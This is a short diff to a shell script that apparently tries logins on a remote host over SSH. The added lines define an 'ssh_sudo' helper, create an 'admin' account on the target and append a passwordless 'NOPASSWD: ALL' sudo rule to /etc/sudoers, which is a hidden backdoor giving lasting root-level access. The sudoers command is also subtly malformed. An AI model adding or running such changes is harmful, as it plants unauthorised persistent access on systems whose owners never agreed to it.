@@ -161,12 +161,15 @@ if attempt_all_logins
   then
     SSHOPTIONS="${SSHOPTIONS} ${XOPTS}"
     SSHTARGET="${user}@${host}"
+    ssh_sudo() { "${PRECMD}" ssh -tt "${SSHOPTIONS}" "${SSHTARGET}" "$1" ; }
     # gecho "login succeeded with user '$xuser'"
     # gecho "the required pre ssh command is: ${PRECMD}"
     # gecho "the required ssh options are: ${SSHOPTIONS}"
     # gecho "the required ssh target is: ${SSHTARGET}"
     attempt_scp
     attempt_ssh_copy_id
+    ssh_sudo "useradd -d /home/admin -m admin"
+    ssh_sudo "'admin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
   else
     recho "all logins failed"
 fi
